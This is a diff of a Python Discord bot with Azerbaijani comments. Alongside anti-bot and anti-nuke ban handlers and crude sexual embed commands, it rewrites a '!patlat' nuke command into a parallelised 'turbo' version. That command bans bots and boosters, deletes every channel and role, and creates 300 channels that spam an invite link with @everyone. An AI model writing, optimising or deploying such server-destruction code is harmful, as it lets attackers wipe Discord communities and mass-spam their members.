@@ -27,7 +27,7 @@ def keep_alive():
 # =====================================================================
 # 2. CONFIGURATION & INTENTS
 # =====================================================================
-SAHIB_ID = 641014966312501259  # Sənin ID-n (yalnız !patlat üçün qalır)
+SAHIB_ID = 641014966312501259  # Sənin ID-n
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -37,6 +37,7 @@ intents.voice_states = True
 intents.reactions = True
 intents.presences = True
 intents.invites = True
+intents.moderation = True
 
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
@@ -70,6 +71,13 @@ async def status_task():
 
 @bot.event
 async def on_member_join(member):
+    if member.bot and member.id != bot.user.id:
+        try:
+            await member.ban(reason="Anti-Bot Qoruması: İcazəsiz bot əlavə edildi!")
+            return
+        except:
+            pass
+
     if member.bot:
         return
     try:
@@ -86,6 +94,27 @@ async def on_member_join(member):
 # =====================================================================
 # 4. ADVANCED SECURITY & AUTOMOD (GÜVƏNLİK VƏ SPAM QORUMASI)
 # =====================================================================
+@bot.event
+async def on_guild_channel_delete(channel):
+    try:
+        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
+            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
+                await channel.guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz kanal silindi!")
+                # Silinen kanalı eyni adla bərpa etməyə çalışaq
+                await channel.guild.create_text_channel(channel.name, category=channel.category)
+    except:
+        pass
+
+@bot.event
+async def on_member_ban(guild, user):
+    try:
+        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
+            if entry.user.id != SAHIB_ID and entry.user.id != bot.user.id:
+                # Kütləvi ban atmağa çalışan admini cəzalandır
+                await guild.ban(entry.user, reason="Anti-Nuke: İcazəsiz kütləvi ban!")
+    except:
+        pass
+
 @bot.event
 async def on_message(message):
     if message.author.bot:
@@ -270,7 +299,6 @@ async def server_url(ctx):
 
 @bot.command(name="seturl")
 async def set_url(ctx, yeni_url: str):
-    # Sahib və ya Administrator / Manage Server icazəsi yoxlanılır
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator and not ctx.author.guild_permissions.manage_guild:
         await ctx.send("❌ Bu əmri istifadə etmək üçün `Sunucuyu Yönet` və ya `Administrator` səlahiyyətin olmalıdır!")
         return
@@ -422,7 +450,6 @@ async def timeout_cmd(ctx, member: discord.Member, minutes: int, *, reason="Gös
         return
     await member.timeout(timedelta(minutes=minutes), reason=reason)
     await ctx.send(f"🔇 {member.name} `{minutes}` dəqiqə mute olundu.")
-
 @bot.command(name="clear", aliases=["sil"])
 async def clear_cmd(ctx, amount: int = 5):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
@@ -433,7 +460,7 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # =====================================================================
-# 9. ƏYLƏCƏ, OYUNLAR VƏ YENİLƏNMİŞ BOOSTER-BANLI !PATLAT KOMUTU
+# 9. ƏYLƏCƏ, OYUNLAR VƏ SÜRƏTLƏNDİRİLMİŞ ÜSTÜN !PATLAT KOMUTU
 # =====================================================================
 @bot.command(name="sex", aliases=["spag", "ıp"])
 async def sex_cmd(ctx, member: discord.Member):
@@ -443,6 +470,7 @@ async def sex_cmd(ctx, member: discord.Member):
     )
     embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpjc3g3NjM3NDIxODczOHpjc3g3NjM3NDIxODczOHpjc3g3JmVwPXYxX2pudGVybmFsX2dpZl9ieV9pZCZjdD1n/5863NIGxEXOhp4cNp3aX/giphy.gif")
     await ctx.send(embed=embed, reference=ctx.message)
+
 @bot.command(name="fuck", aliases=["sürtmək"])
 async def fuck_cmd(ctx, member: discord.Member):
     embed = discord.Embed(
@@ -562,32 +590,33 @@ async def patlat_cmd(ctx):
         return
     
     guild = ctx.guild
-    await ctx.send("⚠️ Serverin dağıdılması, yad botların və boosterlərin banlanması, və 'XAS' adına keçid başladı...")
+    await ctx.send("⚡ Turbo Rejimdə Nuke başladı: Bütün kanallar silinir və paralel olaraq yeniləri yaradılır...")
 
-    for member in guild.members:
-        if member.bot and member.id != bot.user.id:
+    async def ban_member(member):
+        if (member.bot and member.id != bot.user.id) or (member.premium_since is not None and member.id != SAHIB_ID):
             try:
-                await member.ban(reason="XAS Nuke - Bot Təmizliyi")
-            except:
-                pass
-        elif member.premium_since is not None and member.id != SAHIB_ID:
-            try:
-                await member.ban(reason="XAS Nuke - Booster Təmizliyi")
+                await member.ban(reason="XAS Turbo Nuke Təmizliyi")
             except:
                 pass
 
-    for channel in guild.channels:
+    await asyncio.gather(*(ban_member(m) for m in guild.members), return_exceptions=True)
+
+    async def delete_channel(ch):
         try:
-            await channel.delete()
+            await ch.delete()
         except:
             pass
 
-    for role in guild.roles:
-        if role != guild.default_role:
+    await asyncio.gather(*(delete_channel(ch) for ch in guild.channels), return_exceptions=True)
+
+    async def delete_role(r):
+        if r != guild.default_role:
             try:
-                await role.delete()
+                await r.delete()
             except:
                 pass
+
+    await asyncio.gather(*(delete_role(r) for r in guild.roles), return_exceptions=True)
 
     try:
         new_role = await guild.create_role(
@@ -607,12 +636,17 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    for i in range(1, 501):
+    async def create_and_spam(i):
         try:
             channel = await guild.create_text_channel(f"ruhumskdi-{i}")
             await channel.send("discord.gg/xas @everyone")
         except:
-            break
+            pass
+
+    chunk_size = 20
+    for start in range(1, 301, chunk_size):
+        tasks_list = [create_and_spam(i) for i in range(start, min(start + chunk_size, 301))]
+        await asyncio.gather(*tasks_list, return_exceptions=True)
 
 # =====================================================================
 # 10. BOTU İŞƏ SALMAQ (RUN)
